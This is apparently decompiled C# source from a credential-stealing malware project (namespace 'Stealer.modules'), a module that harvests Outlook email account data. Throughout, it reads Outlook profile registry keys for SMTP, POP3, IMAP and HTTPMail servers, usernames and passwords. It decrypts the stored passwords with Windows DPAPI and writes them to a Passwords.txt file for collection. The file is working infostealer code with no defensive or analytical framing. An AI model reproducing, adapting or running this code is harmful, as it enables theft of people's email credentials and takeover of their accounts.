﻿using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Stealer.modules
{
	// Token: 0x02000033 RID: 51
	internal class MailClient
	{
		// Token: 0x06000105 RID: 261 RVA: 0x0000C5B0 File Offset: 0x0000A7B0
		public static void GoMailClient()
		{
			MailClient.GrabOutlook();
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000C5B8 File Offset: 0x0000A7B8
		private static void GrabOutlook()
		{
			string str = Program.path + "\\";
			string str2 = "";
			string str3 = "\\Mail\\Outlook";
			string[] array = new string[]
			{
				"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
			};
			string[] clients = new string[]
			{
				"SMTP Email Address",
				"SMTP Server",
				"POP3 Server",
				"POP3 User Name",
				"SMTP User Name",
				"NNTP Email Address",
				"NNTP User Name",
				"NNTP Server",
				"IMAP Server",
				"IMAP User Name",
				"Email",
				"HTTP User",
				"HTTP Server URL",
				"POP3 User",
				"IMAP User",
				"HTTPMail User Name",
				"HTTPMail Server",
				"SMTP User",
				"POP3 Password2",
				"IMAP Password2",
				"NNTP Password2",
				"HTTPMail Password2",
				"SMTP Password2",
				"POP3 Password",
				"IMAP Password",
				"NNTP Password",
				"HTTPMail Password",
				"SMTP Password"
			};
			foreach (string path in array)
			{
				str2 += MailClient.Get(path, clients);
			}
			try
			{
				Directory.CreateDirectory(str + str3);
				File.WriteAllText(str + str3 + "\\Passwords.txt", str2 + "\r\n");
			}
			catch
			{
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000C798 File Offset: 0x0000A998
		private static string Get(string path, string[] clients)
		{
			Regex regex = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
			Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
			string text = "";
			try
			{
				foreach (string text2 in clients)
				{
					try
					{
						object infoFromReg = MailClient.GetInfoFromReg(path, text2);
						if (infoFromReg != null && text2.Contains("Password") && !text2.Contains("2"))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								MailClient.Decrypt((byte[])infoFromReg),
								"\r\n"
							});
						}
						else if (regex.IsMatch(infoFromReg.ToString()) || regex2.IsMatch(infoFromReg.ToString()))
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								infoFromReg.ToString(),
								"\r\n"
							});
						}
						else
						{
							text = string.Concat(new string[]
							{
								text,
								text2,
								": ",
								Encoding.UTF8.GetString((byte[])infoFromReg).Replace(Convert.ToChar(0).ToString(), ""),
								"\r\n"
							});
						}
					}
					catch
					{
					}
				}
				foreach (string str in Registry.CurrentUser.OpenSubKey(path, false).GetSubKeyNames())
				{
					text += MailClient.Get(path + "\\" + str, clients);
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000C984 File Offset: 0x0000AB84
		private static object GetInfoFromReg(string path, string valueName)
		{
			object result = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				result = registryKey.GetValue(valueName);
				registryKey.Close();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000C9C4 File Offset: 0x0000ABC4
		private static string Decrypt(byte[] encrypted)
		{
			try
			{
				byte[] array = new byte[encrypted.Length - 1];
				Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}
	}
}
